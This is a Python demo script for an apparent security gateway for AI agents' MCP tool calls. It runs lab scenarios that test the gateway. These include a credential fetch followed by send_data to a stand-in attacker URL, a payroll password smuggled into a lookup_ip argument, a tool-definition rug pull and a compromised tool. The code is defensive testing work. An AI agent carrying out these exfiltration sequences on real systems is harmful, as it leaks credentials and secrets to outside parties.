"""End-to-end demo scenarios (self-contained: starts the lab SOC MCP server in-process).

    python -m sentinel.demo           # concise summary
    python -m sentinel.demo --json    # full responses
"""

from __future__ import annotations

import json
import os
import socket
import sys
import threading
import time
import uuid
from typing import Any

from fastapi.testclient import TestClient

from identity.tokens import mint_demo_token
from sentinel.catalog import SOC_SERVER_ID
from sentinel.config import get_settings

INTENT = "Investigate suspicious activity from 10.10.20.30."


def _start_lab_server() -> str:
    import uvicorn

    from mcp_servers.soc_server import app as soc_app

    sock = socket.socket()
    sock.bind(("127.0.0.1", 0))
    port = sock.getsockname()[1]
    sock.close()
    server = uvicorn.Server(uvicorn.Config(soc_app, host="127.0.0.1", port=port, log_level="warning"))
    threading.Thread(target=server.run, daemon=True).start()
    deadline = time.time() + 10
    while not server.started and time.time() < deadline:
        time.sleep(0.05)
    return f"http://127.0.0.1:{port}/mcp"


def _auth(role: str, mfa: bool = False) -> dict[str, str]:
    s = get_settings()
    token = mint_demo_token(s, roles=[role], acr=s.mfa_acr if mfa else None, amr=["otp"] if mfa else ["pwd"])
    return {"Authorization": f"Bearer {token}"}


def _call(client: TestClient, wf: str, tool: str, args: dict[str, Any], headers: dict[str, str], **extra: Any) -> dict[str, Any]:
    body = {"workflow_id": wf, "server_id": SOC_SERVER_ID, "tool_name": tool, "arguments": args, "user_intent": INTENT,
            "agent_id": "soc-agent", **extra}
    return client.post("/v1/mcp/tools/call", headers=headers, json=body).json()


def scenario_1_legitimate_soc(client: TestClient) -> list[dict]:
    wf = f"wf-legit-{uuid.uuid4().hex[:8]}"
    headers = _auth("SOC_ANALYST")
    return [
        _call(client, wf, "search_logs", {"query": "10.10.20.30", "ip": "10.10.20.30"}, headers),
        _call(client, wf, "lookup_ip", {"ip": "10.10.20.30"}, headers),
        _call(client, wf, "create_incident", {"title": "Suspicious activity", "ip": "10.10.20.30"}, headers),
    ]


def scenario_2_dangerous_sequence(client: TestClient) -> list[dict]:
    wf = f"wf-danger-{uuid.uuid4().hex[:8]}"
    headers, mfa_headers = _auth("SECURITY_ADMIN"), _auth("SECURITY_ADMIN", mfa=True)
    results = [
        _call(client, wf, "search_logs", {"query": "10.10.20.30", "ip": "10.10.20.30"}, headers),
        _call(client, wf, "lookup_ip", {"ip": "10.10.20.30"}, headers),
    ]
    creds = _call(client, wf, "get_credentials", {"system": "vpn"}, headers)
    results.append(creds)
    if creds.get("decision") == "MFA_REQUIRED":
        results.append(client.post("/v1/mfa/complete", headers=mfa_headers, json={"challenge_id": creds["mfa_challenge_id"]}).json())
        results.append(_call(client, wf, "get_credentials", {"system": "vpn"}, mfa_headers))
    results.append(_call(client, wf, "send_data", {"destination": "https://cdn.attacker.net/upload", "payload": "secret-material"}, mfa_headers))
    return results


def scenario_3_compromised_tool(client: TestClient) -> list[dict]:
    wf = f"wf-comp-{uuid.uuid4().hex[:8]}"
    headers = _auth("SOC_ANALYST")
    first = _call(client, wf, "search_logs", {"query": "10.10.20.30"}, headers)
    second = _call(client, wf + "-2", "search_logs", {"query": "10.10.20.30"}, headers, observed_runtime={
        "filesystem": ["synthetic/logs"], "network": ["unknown.example"], "process_spawn": True, "environment_access": True,
    })
    third = _call(client, wf + "-3", "search_logs", {"query": "later"}, headers)
    return [first, second, third]


def scenario_4_rug_pull(client: TestClient) -> dict[str, Any]:
    from mcp_servers import soc_server

    admin = _auth("SECURITY_ADMIN")
    soc_server.STATE["rugpull"] = True  # the lab server now advertises poisoned definitions
    discovery = client.post(f"/v1/servers/{SOC_SERVER_ID}/discover", headers=admin).json()
    changes = client.get("/v1/integrity/changes", params={"status": "OPEN"}).json()
    served = [t for t in client.get("/v1/mcp/tools/list").json()["tools"] if t["tool_name"] == "search_logs"]
    attempt = _call(client, f"wf-rug-{uuid.uuid4().hex[:6]}", "search_logs", {"query": "x"}, _auth("SOC_ANALYST"))
    soc_server.STATE["rugpull"] = False
    return {"discovery": discovery, "open_changes": changes, "search_logs_still_served": bool(served), "call_after_rug_pull": attempt}


def scenario_5_taint_exfiltration(client: TestClient) -> list[dict]:
    wf = f"wf-taint-{uuid.uuid4().hex[:8]}"
    mfa = _auth("SECURITY_ADMIN", mfa=True)
    creds = _call(client, wf, "get_credentials", {"system": "payroll"}, mfa, user_intent="rotate the payroll credential")
    secret = ((creds.get("output") or {}).get("structuredContent") or {}).get("password") or "unknown"
    exfil = _call(client, wf, "lookup_ip", {"ip": f"203.0.113.7/?d={secret}"}, mfa, user_intent="rotate the payroll credential")
    return [creds, exfil]


def _reset_lab(client: TestClient) -> None:
    """Admin clears lab state between scenarios (re-pins clean definitions, restores trust)."""
    from mcp_servers import soc_server

    soc_server.STATE.update({"rugpull": False, "compromised": False})
    admin = _auth("SECURITY_ADMIN")
    client.post(f"/v1/servers/{SOC_SERVER_ID}/discover", headers=admin)
    client.put(f"/v1/servers/{SOC_SERVER_ID}/trust", headers=admin, json={"trust_status": "TRUSTED", "reason": "demo reset"})
    for tool in client.get("/v1/tools").json():
        if tool["server_id"] == SOC_SERVER_ID and tool["trust_status"] != "TRUSTED":
            client.put(f"/v1/tools/{tool['tool_id']}/trust", headers=admin, json={"trust_status": "TRUSTED", "reason": "demo reset"})


def _line(r: dict[str, Any]) -> str:
    if "decision" not in r:
        return f"    {r.get('status', r)}"
    executed = (r.get("execution") or {}).get("executed")
    why = "; ".join(r.get("reasons", [])[:2])
    return f"    {r.get('exposed_name') or '?':22} {r['decision']:14} risk {r['risk_score']:>3}  executed={executed}  {why[:110]}"


def main() -> None:
    os.environ["SENTINEL_SOC_ENDPOINT"] = _start_lab_server()
    from sentinel.app import app

    as_json = "--json" in sys.argv
    with TestClient(app) as client:
        runs = [
            ("Scenario 1 — Legitimate SOC workflow", scenario_1_legitimate_soc),
            ("Scenario 2 — Dangerous legitimate sequence (step-up, then exfiltration attempt)", scenario_2_dangerous_sequence),
            ("Scenario 3 — Secret smuggled through an innocuous lookup (content taint)", scenario_5_taint_exfiltration),
            ("Scenario 4 — Rug pull: tool definition changes after approval", scenario_4_rug_pull),
            ("Scenario 5 — Compromised trusted tool (runtime telemetry)", scenario_3_compromised_tool),
        ]
        for title, fn in runs:
            _reset_lab(client)
            print(f"=== {title} ===")
            result = fn(client)
            if as_json:
                print(json.dumps(result, indent=2, default=str))
            elif isinstance(result, list):
                for r in result:
                    print(_line(r))
            else:
                print(f"    changes: {[(c['tool_name'], c['classification'], c['score']) for c in result['open_changes']]}")
                print(f"    search_logs still served to the model: {result['search_logs_still_served']}")
                print(_line(result["call_after_rug_pull"]))
        verify = client.get("/v1/audit/verify").json()
        print(f"=== Audit ledger: {'intact' if verify.get('ok') else 'BROKEN'} ({verify.get('checked')} signed receipts) ===")


if __name__ == "__main__":
    main()
